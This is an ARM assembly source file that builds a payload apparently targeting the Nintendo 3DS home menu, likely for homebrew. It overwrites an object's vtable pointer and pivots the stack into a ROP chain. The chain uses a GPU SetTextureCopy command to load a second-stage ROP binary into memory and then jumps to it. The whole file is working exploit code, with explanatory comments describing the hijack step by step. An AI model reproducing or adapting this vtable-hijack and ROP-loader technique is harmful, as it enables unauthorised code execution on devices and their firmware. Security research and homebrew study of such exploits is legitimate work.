.nds

.include "../build/constants.s"

.create "menu_payload_loadropbin.bin",0x0

.include "menu_include.s"

MENU_OBJECT_LOC equ 0xBABE0000 ; for relocation

; basically we overwrite an object's data to get home menu to do what we want
; first we overwrite the vtable pointer so that we can get the code to jump to where we want
; the method we use for that is located at vtable + 0x8
; with that we can put a in our vtable to our stack pivot
; our stack pivot works by loading a bunch of registers from [r4]
; fortunately we know r4 = object + 0x4, so we manufacture our object accordingly
; and then we get ROP under home menu !

.orga 0x0

	object:
		.word MENU_OBJECT_LOC + vtable - object ; pointer to manufactured vtable, and new sp
		.word ROP_MENU_POP_PC ; pc (pop {pc} to jump to ROP)

		.word 0xDEADCAFE ; filler to avoid having stuff overwritten
		.word 0xDEADCAFE ; filler to avoid having stuff overwritten
		.word 0xDEADCAFE ; filler to avoid having stuff overwritten
		.word 0xDEADCAFE ; filler to avoid having stuff overwritten

	vtable: ; also initial ROP
		.word ROP_MENU_POP_R4R5PC ; pop {r4, r5, pc} : skip pivot
			.word 0xDEADBABE ; r4 (garbage)
			.word ROP_MENU_STACK_PIVOT ; stack pivot ; also r5 (garbage)
	rop:
		gsp_acquire_right
		send_gx_cmd MENU_OBJECT_LOC + gxCommandGetRopbin - object
		sleep 10*1000*1000, 0x00000000
		gsp_release_right
		jump_sp MENU_LOADEDROP_BUFADR ; sp

	gxCommandGetRopbin:
		.word 0x01000004 ; command header (SetTextureCopy)
		.word 0xFADE0001 ; source address
		.word MENU_LOADEDROP_BUFADR ; destination address (standin, will be filled in)
		.word 0xFADE0002 ; size
		.word 0x00000000 ; dim in
		.word 0x00000000 ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused
	; .fill ((object + 0x60) - .), 0x0

.Close
